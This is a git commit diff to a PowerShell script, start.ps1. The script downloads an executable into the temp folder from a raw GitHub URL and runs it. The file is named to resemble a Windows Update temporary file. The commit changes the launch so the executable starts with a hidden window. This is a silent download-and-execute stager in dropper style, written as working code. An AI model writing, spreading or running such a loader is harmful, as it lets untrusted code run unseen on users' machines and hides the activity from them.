1d75e2c9f8b18ee8a8b7031b5f6fff2e9d4f48f2
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-13 11:21:12 -0600

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,3 +1,3 @@
 New-Item "$env:temp\wsuA58F.tmp"
 (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
-Start-Process "$env:temp\wsuA58F.exe"
+Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
